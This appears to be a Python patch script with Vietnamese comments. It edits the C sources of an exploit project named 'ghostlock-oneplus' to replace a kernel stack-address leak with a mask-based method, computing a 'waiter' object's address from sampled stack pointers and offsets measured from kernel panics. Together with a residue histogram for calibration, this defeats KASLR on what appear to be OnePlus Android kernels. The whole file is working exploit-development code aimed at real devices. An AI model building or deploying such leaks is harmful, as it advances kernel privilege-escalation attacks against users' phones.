#!/usr/bin/env python3
"""patch_waiter_leak_mask.py

Bỏ cách so IP (sai vì KASLR slide ở máy này là 0x170000 = bội 64 KB, KHÔNG phải
bội 2 MB).  Dùng hằng số hình học đã đo từ 5 panic khác nhau:

    waiter mod 0x4000 == 0x3d10      (kpP/kpr/kpPB/QC: …bd10 ; dump67: …3d10)

và waiter = SP0-0x1b0 với SP0 = stack_top-0x110 ⇒ với MỌI sample kernel-mode của
T (SP nằm trong stack của T), ta có:

    waiter = (SP & ~0x3fff) | 0x3d10

=> không cần slide, không cần biết hàm đang chạy.
Đồng thời log histogram `SP & 0x3fff` (để hiệu chỉnh nếu hằng số khác) và cho phép
override bằng env `WAITER_LO14=0x....`.
"""
U = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(U).read()

old = """      if (abi == 1) {
        uint64_t sp = ((uint64_t *)p)[31];
        uint64_t w = 0;
        if (ssopt_ip_in(ip, SOCK_SETSOCKOPT_OFF, 0x500)) { w = sp + 0x20; wl_insock++; }
        else if (ssopt_ip_in(ip, SYS_SETSOCKOPT_OFF, 0x100)) { w = sp - 0x160; wl_insys++; }
        if (w) {
          int k = -1;
          for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w) { k = t; break; }
          if (k >= 0) wl_cnt[k]++;
          else if (wl_nc < 16) { wl_cand[wl_nc] = w; wl_cnt[wl_nc] = 1; wl_nc++; }
        }
      }"""
new = """      if (abi == 1) {
        uint64_t sp = ((uint64_t *)p)[31];
        uint64_t lo = sp & 0x3fffULL;
        wl_lo_hist[lo & 0xff]++;               /* residue histogram (calibration) */
        uint64_t w = (sp & ~0x3fffULL) | (wl_lo_mask & 0x3fffULL);
        (void)ip;
        if ((w >> 32) == 0xffffff80ULL) {
          wl_insock++;                          /* accepted */
          int k = -1;
          for (int t = 0; t < wl_nc; t++) if (wl_cand[t] == w) { k = t; break; }
          if (k >= 0) wl_cnt[k]++;
          else if (wl_nc < 16) { wl_cand[wl_nc] = w; wl_cnt[wl_nc] = 1; wl_nc++; }
        }
      }"""
assert u.count(old) == 1, ("drain body", u.count(old))
u = u.replace(old, new, 1)

old = """static uint64_t wl_cand[16];
static int wl_cnt[16], wl_nc;
static int wl_samples, wl_insock, wl_insys;
static int wl_ring_lost;"""
new = """static uint64_t wl_cand[16];
static int wl_cnt[16], wl_nc;
static int wl_samples, wl_insock, wl_insys;
static int wl_ring_lost;
static uint64_t wl_lo_hist[256];                 /* SP & 0x3fff histogram */
static uint64_t wl_lo_mask = 0x3d10;             /* waiter mod 0x4000 (measured) */

void ssopt_set_waiter_lo(void) {
  char *e = getenv("WAITER_LO14");
  if (e) wl_lo_mask = strtoul(e, 0, 0);
}"""
assert u.count(old) == 1, ("globals", u.count(old))
u = u.replace(old, new, 1)

old = """  pr_info("waiter leak: samples=%d in_sock=%d in_sys=%d cands=%d best=%016zx "
          "x%d lost=%d\\n",
          wl_samples, wl_insock, wl_insys, wl_nc, (uintptr_t)best, bestn,
          wl_ring_lost);
  return best;"""
new = """  pr_info("waiter leak: samples=%d accepted=%d cands=%d best=%016zx x%d "
          "lost=%d lo=0x%zx\\n",
          wl_samples, wl_insock, wl_nc, (uintptr_t)best, bestn, wl_ring_lost,
          (size_t)wl_lo_mask);
  {   /* top-3 SP residues: lets us calibrate WAITER_LO14 from the log */
    for (int r = 0; r < 3; r++) {
      uint64_t bv = 0; int bi = -1;
      for (int t = 0; t < 256; t++) if (wl_lo_hist[t] > bv) { bv = wl_lo_hist[t]; bi = t; }
      if (bi < 0 || bv == 0) break;
      pr_info("  sp&0x3fff hist[%d] = %d\\n", bi, (int)bv);
      wl_lo_hist[bi] = 0;
    }
  }
  return best;"""
assert u.count(old) == 1, ("result log", u.count(old))
u = u.replace(old, new, 1)
open(U, "w").write(u)
print("util.c: mask-based waiter leak (SP&~0x3fff | 0x3d10) + residue histogram")

F = "/root/ghostlock/ghostlock-oneplus/src/core/fops.c"
s = open(F).read()
old = """    if (ssopt_perf_begin() == 0) {
      static unsigned char dummy[0x100];"""
new = """    ssopt_set_waiter_lo();
    if (ssopt_perf_begin() == 0) {
      static unsigned char dummy[0x100];"""
assert s.count(old) == 1, ("fops begin", s.count(old))
s = s.replace(old, new, 1)
open(F, "w").write(s)
print("fops.c: ssopt_set_waiter_lo() before the sampler")

C = "/root/ghostlock/ghostlock-oneplus/src/core/common.h"
c = open(C).read()
old = "void ssopt_perf_drain(void);"
new = "void ssopt_set_waiter_lo(void);\nvoid ssopt_perf_drain(void);"
assert c.count(old) == 1, ("common", c.count(old))
c = c.replace(old, new, 1)
open(C, "w").write(c)
print("common.h: ssopt_set_waiter_lo decl")
